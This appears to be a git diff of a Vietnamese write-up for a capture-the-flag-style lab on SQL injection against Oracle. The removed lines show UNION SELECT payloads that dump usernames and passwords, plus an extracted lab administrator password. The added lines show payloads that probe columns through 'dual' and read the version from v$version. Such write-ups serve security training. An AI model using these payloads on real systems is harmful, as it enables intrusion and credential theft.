@@ -1,26 +1,18 @@
 ## SQL injection attack, querying the database type and version on Oracle
 
-1. Lab cho ta biết rằng trong database có một bảng ``users`` chứa username và password
+1. Theo như đề bài, database của lab này là Oracle SQL nên truy vấn SELECT vào cũng chỉ định vào 1 table cụ thể. Trong Oracle cung cấp một build-in table ``dual`` nhằm mục đích truy vấn data ngoài bảng có sẵn.
 
-2. Xác định số cột trong bảng category bằng cách sử dụng lần lượt các câu truy vấn UNION SELECT gắn giá trị ``null`` cho từng cột
-	Payload: 
-	```' UNION SELECT null --```
-	```' UNION SELECT null, null --```
--> Xác định được số cột trong bảng category là 2
+2. Xác định số cột trong bảng category và xác định cột chứa kiểu dữ liệu string
+Payload: 	
+- ```' UNION SELECT 'test' from dual --```
+- ```' UNION SELECT 'test', null from dual --```
+- ```' UNION SELECT null, 'test' from dual --```
 
-3. Tiếp theo xác định cột chứa dữ liệu dạng string 
-	 Payload: 
-	```' UNION SELECT 'test',null --```
-	```' UNION SELECT null, 'test' --```
+![Img1](\asset/../img/determine_col_num.png)
 
-![Img1](\asset/../img/determine_col_contain_text.png)
+-> Xác định được số cột là 2 và cả 2 cột đều có kiểu string
+3. Để xác định database version trong Oracle dùng câu query ``SELECT banner FROM v$version``
+Payload: 	
+- ```' UNION SELECT banner, null FROM v$version--```
 
-4. Qua đó ta biết được rằng cột 2 có kiểu string. Do chỉ có cột 2 trả về string nên ta sẽ tiến hành nối chuỗi username và password trong 1 câu truy vấn
-	Payload:
-	```' UNION SELECT null, username || password from users--```
-
-![Img2](\asset/../img/result.png)
-
-5. Login với ``administrator:s8i5jvyggjzv1nvihot0``
-
-![Img3](\asset/../img/done.png)
+![Img2](\asset/../img/done.png)
